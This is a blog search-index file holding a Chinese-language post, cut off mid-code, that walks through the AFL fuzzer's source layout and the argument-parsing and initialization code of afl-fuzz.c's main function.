<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>AFL源码及流程分析</title>
      <link href="/posts/95726211.html"/>
      <url>/posts/95726211.html</url>
      
        <content type="html"><![CDATA[<h1 id="源码文件结构"><a href="#源码文件结构" class="headerlink" title="源码文件结构"></a>源码文件结构</h1><p>这里我们直接在AFL的网站上下载最新的代码之后，即得到如下的文件夹</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lyyl@lyyl:~/Desktop/afl/afl<span class="number">-2.52b</span>$ ls</span><br><span class="line">afl-analyze    afl-as.c   afl-clang++  afl-fuzz.c  afl-gcc.c     afl-plot       afl-tmin     alloc-inl.h  debug.h       experimental   libtokencap  qemu_mode            testcases</span><br><span class="line">afl-analyze.c  afl-as.h   afl-cmin     afl-g++     afl-gotcpu    afl-showmap    afl-tmin.c   as           dictionaries  hash.h         llvm_mode    QuickStartGuide.txt  test-instr.c</span><br><span class="line">afl-as         afl-clang  afl-fuzz     afl-gcc     afl-gotcpu.c  afl-showmap.c  afl-whatsup  config.h     docs          libdislocator  Makefile     README               types.h</span><br><span class="line">lyyl@lyyl:~/Desktop/afl/afl<span class="number">-2.52b</span>$</span><br></pre></td></tr></table></figure><p>这里主要的代码位于afl-fuzz.c这个文件中是整个afl的核心代码。这里我们先来看一下各个模块的主要功能以及作用</p><table><thead><tr><th>afl-as.c，afl-as.h，afl-gcc.c</th><th>普通的插桩模式，gcc和clang都适用。</th></tr></thead><tbody><tr><td>llvm_mode</td><td>llvm插桩模式，只适用于clang</td></tr><tr><td>qemu_mode</td><td>qemu插桩模式的，针对的是二进制文件</td></tr><tr><td>afl-fuzz.c</td><td>fuzzer实现的核心代码，是整个AFL的核心</td></tr><tr><td>libdislocator</td><td>简单的内存检测的工具</td></tr><tr><td>libtokencap</td><td>语法的关键字提取并生成相应的字典文件</td></tr><tr><td>afl-analyze.c</td><td>对测试样例的字典进行分析</td></tr><tr><td>afl-cmin</td><td>对fuzzing用到的语料库进行一个精简的操作</td></tr><tr><td>afl-tmin.c</td><td>对fuzzing中用到的测试用例进行最小化的操作</td></tr><tr><td>afl-gotcpu.c</td><td>统计CPU的占用率</td></tr><tr><td>afl-plot</td><td>绘制报告图标</td></tr><tr><td>afl-showmap.c</td><td>打印目标程序单轮fuzz之后的tuple也就是路径信息</td></tr><tr><td>afl-whatsup</td><td>各个并行的例程的fuzzing结果统计</td></tr><tr><td>alloc-inl.h</td><td>定义带有检测功能的内存分配以及释放的操作</td></tr><tr><td>config.h</td><td>配置信息</td></tr><tr><td>debug.h</td><td>跟提示信息相关的一些宏定义</td></tr><tr><td>Hash.h</td><td>hash函数的实现以及定义</td></tr><tr><td>Types.h</td><td>部分的类型以及宏定义</td></tr><tr><td>test-instr.c</td><td>作为测试的目标程序</td></tr><tr><td>Docs</td><td>项目的一些相关的文档</td></tr><tr><td>experimental</td><td>一些新特性的实验研究</td></tr></tbody></table><h1 id="Main函数"><a href="#Main函数" class="headerlink" title="Main函数"></a>Main函数</h1><p>这里我们先来看一下main函数，该函数定义在afl-fuzz.c文件中，整个main函数共分为5个部分</p><ul><li>参数处理：主要是根据用户启动afl二进制程序是传入的参数进行相应的mode等配置设置</li><li>初始化：获取特殊环境变量的值、设置输出文件夹、设置共享内存、读取测试用例等</li><li>Dry Run：第一次运行，即首轮Fuz</li><li>Main Loop：循环Fuzz运行</li><li>Exit：Fuzz结束之后的保存测试结果等</li></ul><h2 id="参数处理"><a href="#参数处理" class="headerlink" title="参数处理"></a>参数处理</h2><p>这里是通过一个while循环来实现参数处理逻辑的。主要的代码如</p><ul><li>main函数参数处理部分源码  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ((opt = <span class="built_in">getopt</span>(argc, argv, <span class="string">&quot;+i:o:f:m:t:T:dnCB:S:M:x:Q&quot;</span>)) &gt; <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (opt) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;i&#x27;</span>: <span class="comment">/* input dir */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_dir) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -i options not supported&quot;</span>);</span><br><span class="line">        in_dir = optarg;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(in_dir, <span class="string">&quot;-&quot;</span>)) in_place_resume = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;o&#x27;</span>: <span class="comment">/* output dir */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (out_dir) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -o options not supported&quot;</span>);</span><br><span class="line">        out_dir = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: &#123; <span class="comment">/* master sync ID */</span></span><br><span class="line"></span><br><span class="line">          u8* c;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (sync_id) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -S or -M options not supported&quot;</span>);</span><br><span class="line">          sync_id = <span class="built_in">ck_strdup</span>(optarg);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ((c = <span class="built_in">strchr</span>(sync_id, <span class="string">&#x27;:&#x27;</span>))) &#123;</span><br><span class="line"></span><br><span class="line">            *c = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">sscanf</span>(c + <span class="number">1</span>, <span class="string">&quot;%u/%u&quot;</span>, &amp;master_id, &amp;master_max) != <span class="number">2</span> ||</span><br><span class="line">                !master_id || !master_max || master_id &gt; master_max ||</span><br><span class="line">                master_max &gt; <span class="number">1000000</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Bogus master ID passed to -M&quot;</span>);</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          force_deterministic = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>: </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sync_id) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -S or -M options not supported&quot;</span>);</span><br><span class="line">        sync_id = <span class="built_in">ck_strdup</span>(optarg);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;f&#x27;</span>: <span class="comment">/* target file */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (out_file) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -f options not supported&quot;</span>);</span><br><span class="line">        out_file = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>: <span class="comment">/* dictionary */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (extras_dir) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -x options not supported&quot;</span>);</span><br><span class="line">        extras_dir = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>: &#123; <span class="comment">/* timeout */</span></span><br><span class="line"></span><br><span class="line">          u8 suffix = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (timeout_given) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -t options not supported&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">sscanf</span>(optarg, <span class="string">&quot;%u%c&quot;</span>, &amp;exec_tmout, &amp;suffix) &lt; <span class="number">1</span> ||</span><br><span class="line">              optarg[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Bad syntax used for -t&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (exec_tmout &lt; <span class="number">5</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Dangerously low value of -t&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (suffix == <span class="string">&#x27;+&#x27;</span>) timeout_given = <span class="number">2</span>; <span class="keyword">else</span> timeout_given = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>: &#123; <span class="comment">/* mem limit */</span></span><br><span class="line"></span><br><span class="line">          u8 suffix = <span class="string">&#x27;M&#x27;</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (mem_limit_given) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -m options not supported&quot;</span>);</span><br><span class="line">          mem_limit_given = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(optarg, <span class="string">&quot;none&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            mem_limit = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">sscanf</span>(optarg, <span class="string">&quot;%llu%c&quot;</span>, &amp;mem_limit, &amp;suffix) &lt; <span class="number">1</span> ||</span><br><span class="line">              optarg[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Bad syntax used for -m&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">switch</span> (suffix) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;T&#x27;</span>: mem_limit *= <span class="number">1024</span> * <span class="number">1024</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;G&#x27;</span>: mem_limit *= <span class="number">1024</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;k&#x27;</span>: mem_limit /= <span class="number">1024</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:  <span class="built_in">FATAL</span>(<span class="string">&quot;Unsupported suffix or bad syntax for -m&quot;</span>);</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (mem_limit &lt; <span class="number">5</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Dangerously low value of -m&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">sizeof</span>(<span class="type">rlim_t</span>) == <span class="number">4</span> &amp;&amp; mem_limit &gt; <span class="number">2000</span>)</span><br><span class="line">            <span class="built_in">FATAL</span>(<span class="string">&quot;Value of -m out of range on 32-bit systems&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>: <span class="comment">/* skip deterministic */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (skip_deterministic) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -d options not supported&quot;</span>);</span><br><span class="line">        skip_deterministic = <span class="number">1</span>;</span><br><span class="line">        use_splicing = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>: <span class="comment">/* load bitmap */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* This is a secret undocumented option! It is useful if you find</span></span><br><span class="line"><span class="comment">           an interesting test case during a normal fuzzing process, and want</span></span><br><span class="line"><span class="comment">           to mutate it without rediscovering any of the test cases already</span></span><br><span class="line"><span class="comment">           found during an earlier run.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           To use this mode, you need to point -B to the fuzz_bitmap produced</span></span><br><span class="line"><span class="comment">           by an earlier run for the exact same binary... and that&#x27;s it.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           I only used this once or twice to get variants of a particular</span></span><br><span class="line"><span class="comment">           file, so I&#x27;m not making this an official setting. */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_bitmap) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -B options not supported&quot;</span>);</span><br><span class="line"></span><br><span class="line">        in_bitmap = optarg;</span><br><span class="line">        <span class="built_in">read_bitmap</span>(in_bitmap);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>: <span class="comment">/* crash mode */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (crash_mode) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -C options not supported&quot;</span>);</span><br><span class="line">        crash_mode = FAULT_CRASH;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>: <span class="comment">/* dumb mode */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (dumb_mode) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -n options not supported&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_DUMB_FORKSRV&quot;</span>)) dumb_mode = <span class="number">2</span>; <span class="keyword">else</span> dumb_mode = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;T&#x27;</span>: <span class="comment">/* banner */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (use_banner) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -T options not supported&quot;</span>);</span><br><span class="line">        use_banner = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;Q&#x27;</span>: <span class="comment">/* QEMU mode */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (qemu_mode) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -Q options not supported&quot;</span>);</span><br><span class="line">        qemu_mode = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!mem_limit_given) mem_limit = MEM_LIMIT_QEMU;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">usage</span>(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ul><p>这里我们可以将AFL的参数总结如下</p><ul><li>-i, -o：分别更改全局变量<code>in_dir</code>以及<code>out_dir</code>的值。表示的就是输入文件夹以及输出文件夹的位置。</li><li>-M，-S：更改全局变量<code>sync_id</code> 的值，用来进行并行设置</li><li>-f：指定临时的输出文件，更改全局变量<code>out_file</code> 的值。</li><li>-x：更改全局变量<code>extras_dir</code> 的值，表示的是用户指定的字典</li><li>-t：<code>%u%c</code> 的格式分别读取到全局变量<code>exec_tmout</code> 与局部变量<code>suffix</code> 变量中，最终改变的是<code>timeout_given</code> 的值</li><li>-m：<code>%llu%c</code> 的格式分别读取到全局变量<code>mem_limit</code> 与局部变量<code>suffix</code> 中，这里最小的内存不能小于5M，最大不超过2000M</li><li>-d：更改全局变量<code>skip_deterministic</code> 与<code>use_splicing</code> 的值，表示的是跳过确定性变异过程</li><li>-B：更改全局变量<code>in_bitmap</code> 的值，表示指定bitmap，并将其读取到<code>in_bitmap</code> 中。这表示我们可以选择自己该兴趣的bitmap然后从其开始进行变异</li><li>-C：更改全局变量<code>crash_mode</code> 的值，这里我们可以将一个崩溃的测试用例输入到AFL中，此时不发生崩溃的或者执行路径没有明显变化的变异样本将会被丢弃</li><li>-n：更改全局变量<code>dumb_mode</code> 的值，表示不再进行插桩</li><li>-T：指定banner</li><li>-Q：更改全局变量<code>qemu_mode</code> 的值，表示的是进入到qemu插桩模式中</li></ul><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><ul><li>main函数中初始化相关部分代码如下  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (optind == argc || !in_dir || !out_dir) <span class="built_in">usage</span>(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setup_signal_handlers</span>();</span><br><span class="line">  <span class="built_in">check_asan_opts</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sync_id) <span class="built_in">fix_up_sync</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(in_dir, out_dir))</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;Input and output directories can&#x27;t be the same&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dumb_mode) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (crash_mode) <span class="built_in">FATAL</span>(<span class="string">&quot;-C and -n are mutually exclusive&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (qemu_mode)  <span class="built_in">FATAL</span>(<span class="string">&quot;-Q and -n are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_NO_FORKSRV&quot;</span>))    no_forkserver    = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_NO_CPU_RED&quot;</span>))    no_cpu_meter_red = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_NO_ARITH&quot;</span>))      no_arith         = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_SHUFFLE_QUEUE&quot;</span>)) shuffle_queue    = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_FAST_CAL&quot;</span>))      fast_cal         = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_HANG_TMOUT&quot;</span>)) &#123;</span><br><span class="line">    hang_tmout = <span class="built_in">atoi</span>(<span class="built_in">getenv</span>(<span class="string">&quot;AFL_HANG_TMOUT&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span> (!hang_tmout) <span class="built_in">FATAL</span>(<span class="string">&quot;Invalid value of AFL_HANG_TMOUT&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dumb_mode == <span class="number">2</span> &amp;&amp; no_forkserver)</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;AFL_DUMB_FORKSRV and AFL_NO_FORKSRV are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_PRELOAD&quot;</span>)) &#123;</span><br><span class="line">    <span class="built_in">setenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>, <span class="built_in">getenv</span>(<span class="string">&quot;AFL_PRELOAD&quot;</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">setenv</span>(<span class="string">&quot;DYLD_INSERT_LIBRARIES&quot;</span>, <span class="built_in">getenv</span>(<span class="string">&quot;AFL_PRELOAD&quot;</span>), <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_LD_PRELOAD&quot;</span>))</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;Use AFL_PRELOAD instead of AFL_LD_PRELOAD&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">save_cmdline</span>(argc, argv);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fix_up_banner</span>(argv[optind]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">check_if_tty</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">get_core_count</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> HAVE_AFFINITY</span></span><br><span class="line">  <span class="built_in">bind_to_free_cpu</span>();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* HAVE_AFFINITY */</span></span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">check_crash_handling</span>();</span><br><span class="line">  <span class="built_in">check_cpu_governor</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setup_post</span>();</span><br><span class="line">  <span class="built_in">setup_shm</span>();</span><br><span class="line">  <span class="built_in">init_count_class16</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setup_dirs_fds</span>();</span><br><span class="line">  <span class="built_in">read_testcases</span>();</span><br><span class="line">  <span class="built_in">load_auto</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">pivot_inputs</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (extras_dir) <span class="built_in">load_extras</span>(extras_dir);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!timeout_given) <span class="built_in">find_timeout</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">detect_file_args</span>(argv + optind + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!out_file) <span class="built_in">setup_stdio_file</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">check_binary</span>(argv[optind]);</span><br><span class="line"></span><br><span class="line">  start_time = <span class="built_in">get_cur_time</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (qemu_mode)</span><br><span class="line">    use_argv = <span class="built_in">get_qemu_argv</span>(argv[<span class="number">0</span>], argv + optind, argc - optind);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    use_argv = argv + optind;</span><br></pre></td></tr></table></figure></li></ul><p>在这一部分将会检查前面我们设置的参数是否存在某些冲突或者错误，例如这里的输入输出文件夹必须要要指定。</p><p>之后调用<code>setup_shm</code> 函数进行了共享内存的设置，这里是通过<code>shmget</code> 函数进行共享内存的分配的。并初始化了<code>virgin_bits,virgin_tmout,virgin_crash,trace_bits</code>等变量。</p><h3 id="测试用例读取"><a href="#测试用例读取" class="headerlink" title="测试用例读取"></a>测试用例读取</h3><p>在初始化过程中还会存在一个比较重要的函数就是<code>read_testcases</code> ，函数的功能就是从输入文件夹中读取所有的测试用例，并将其加入到队列中。函数的关键部分的代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 